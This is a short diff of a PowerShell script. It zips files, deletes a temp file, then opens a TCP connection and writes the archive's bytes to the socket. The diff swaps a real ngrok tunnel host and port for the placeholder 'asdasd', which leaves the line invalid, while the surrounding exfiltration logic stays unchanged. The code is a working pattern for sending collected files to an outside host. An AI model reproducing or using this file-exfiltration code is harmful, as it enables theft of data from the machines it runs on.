@@ -16,7 +16,7 @@ Compress-Archive `
 
 Remove-Item $tempFile -Force
 
-$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io", 18018 )
+$c = New-Object Net.Sockets.TCPClient("asdasd", asdasd )
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
